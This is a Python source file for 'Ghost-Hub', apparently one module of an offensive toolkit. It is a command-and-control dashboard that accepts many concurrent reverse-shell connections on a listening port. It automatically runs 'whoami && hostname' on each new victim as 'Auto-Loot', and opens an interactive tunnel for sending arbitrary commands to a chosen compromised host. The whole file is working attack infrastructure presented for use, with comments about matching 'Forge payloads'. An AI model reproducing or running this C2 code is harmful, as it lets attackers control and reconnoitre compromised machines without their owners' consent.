# --- Module Context: Ghost-Hub (C2 Dashboard) ---
# Purpose: Multi-session manager for managing concurrent reverse shells.
# Rules:
#   - Never close the Hub while sessions are active (sessions will drop).
#   - Use 'interact <ID>' to tunnel into a specific ghost.
#   - Background 'Auto-Loot' runs on connection to map target info.
# Dependencies: socket, threading, rich
# ------------------------------------------------

import socket
import threading
import time
from rich.console import Console
from rich.table import Table
from rich.live import Live
from core.ui import show_briefing, draw_header

console = Console()


class GhostHub:
    def __init__(self):
        self.sessions = {}  # {id: {'socket': s, 'addr': a, 'info': '...'}}
        self.counter = 1
        self.lock = threading.Lock()

    def start_listener(self, port):
        """Standard TCP listener with multi-threading."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", int(port)))
            server.listen(20)
            while True:
                conn, addr = server.accept()
                with self.lock:
                    s_id = self.counter
                    self.sessions[s_id] = {'socket': conn,
                                           'addr': addr, 'info': 'Pending...'}
                    self.counter += 1
                # Trigger Auto-Loot background task
                threading.Thread(target=self.auto_loot,
                                 args=(s_id,), daemon=True).start()
        except:
            pass

    def auto_loot(self, s_id):
        """Automatically gathers system context from new ghosts."""
        try:
            sock = self.sessions[s_id]['socket']
            sock.send(b"whoami && hostname\n")
            data = sock.recv(1024).decode().strip()
            with self.lock:
                self.sessions[s_id]['info'] = data if data else "Unknown System"
        except:
            with self.lock:
                self.sessions[s_id]['info'] = "Looting Failed"

    def interact(self, s_id):
        """Interactive shell tunnel for a specific session."""
        if s_id not in self.sessions:
            return
        sock = self.sessions[s_id]['socket']
        console.print(
            f"[bold red][!] TUNNEL OPEN: Ghost {s_id}. Type 'back' to detach.[/bold red]")
        while True:
            cmd = console.input(f"[Ghost-{s_id}]# ").strip()
            if cmd.lower() == "back":
                break
            if not cmd:
                continue
            sock.send((cmd + "\n").encode())
            console.print(sock.recv(4096).decode())


hub = GhostHub()


def run_ghost_hub():
    show_briefing(
        "GHOST-HUB C2",
        "Centralized management for multiple concurrent 'Ghost' sessions.",
        ["LPORT must match your Forge payloads",
            "Multiple sessions can be backgrounded"]
    )
    port = console.input(
        "[bold yellow]LPORT (Default 4444): [/bold yellow]") or "4444"

    # Run listener in background
    threading.Thread(target=hub.start_listener,
                     args=(port,), daemon=True).start()

    while True:
        draw_header("Ghost Dashboard")
        table = Table(
            title=f"Listening on Port {port}", border_style="magenta")
        table.add_column("ID", style="yellow")
        table.add_column("Address", style="cyan")
        table.add_column("System Info (Auto-Loot)", style="green")

        with hub.lock:
            for sid, data in hub.sessions.items():
                table.add_row(str(sid), data['addr'][0], data['info'])

        console.print(table)
        cmd_input = console.input(
            "\n[Hub] (interact <id> / exit)> ").strip().split()
        if not cmd_input:
            continue

        cmd = cmd_input[0].lower()
        if cmd == "exit":
            break
        if cmd == "interact" and len(cmd_input) > 1:
            hub.interact(int(cmd_input[1]))
